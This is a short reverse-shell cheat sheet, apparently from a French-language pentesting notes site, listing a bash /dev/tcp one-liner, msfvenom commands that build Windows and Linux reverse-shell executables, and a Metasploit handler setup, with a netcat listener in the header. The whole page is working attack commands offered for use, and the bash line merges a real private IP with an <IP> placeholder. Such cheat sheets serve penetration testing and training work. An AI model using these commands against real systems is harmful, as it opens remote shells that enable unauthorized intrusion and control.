---
description: nc -lvp <PORT>
---

# Reverse-shell

### Bash

```
bash -i >& /dev/tcp/192.168.119.164<IP>/<PORT> 0>&1
```

### MSFVenom

```
# Fonctionne avec netcat
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell_reverse_tcp.exe

# Fonctionne avec msfconsole
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
msf> use exploit/multi/handler
msf> set payload linux/x86/meterpreter/reverse_tcp
```
